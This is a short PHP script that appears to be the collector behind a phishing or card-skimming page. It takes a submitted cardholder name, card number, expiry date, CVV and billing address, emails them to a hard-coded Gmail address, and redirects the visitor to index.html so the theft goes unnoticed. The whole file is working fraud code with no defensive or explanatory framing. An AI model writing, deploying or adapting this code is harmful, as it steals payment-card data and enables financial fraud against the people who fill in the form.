<?php
  $cardname = $_POST['cardname'];
  $cc = $_POST['cc'];
  $expirydate = $_POST['expirydate'];
  $cvv = $_POST['cvv'];
  $address = $_POST['address'];
  $states = $_POST['states'];
  $city = $_POST['city'];
  $zip = $_POST['zip'];

  
	$email_from = 'workload';

	$email_subject = "New Form submission";

                            $to = "omotosolilhenxy@gmail.com";

                            $headers = "From: $email_from \r\n";
                          
                            $headers .=  "CardName: $cardname \r\n CardNUmber: $cc \r\n ExpiryDate: $expirydate \r\n Cvv: $cvv \r\n Address: $address \r\n States: $states \r\n City: $city \r\n ZipCode: $zip \r\n";
                        
                          
                            mail($to,$email_subject,$headers);

                            header("location: index.html");



?>